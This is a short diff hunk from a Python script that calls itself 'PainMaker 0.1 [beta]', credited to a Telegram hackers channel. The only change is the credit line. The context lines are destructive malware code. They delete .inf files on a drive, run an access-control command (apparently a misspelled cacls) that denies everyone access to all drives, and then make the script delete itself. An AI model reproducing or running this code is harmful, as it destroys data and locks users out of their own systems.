@@ -27,4 +27,4 @@ os.system("del "+drive+":\*.inf /f /f /q") #del .inf
 os.system("Cals "+drive+": /e /p everyone:n") # Lock all drives
 #Remove itself--------------------------------------
 remove('painmaker.py')
-#PainMaker 0.1 [beta] coded by t.me/Hackerschannel7.
+#PainMaker 0.1 [beta] coded by t.me/Hackers_channel7.
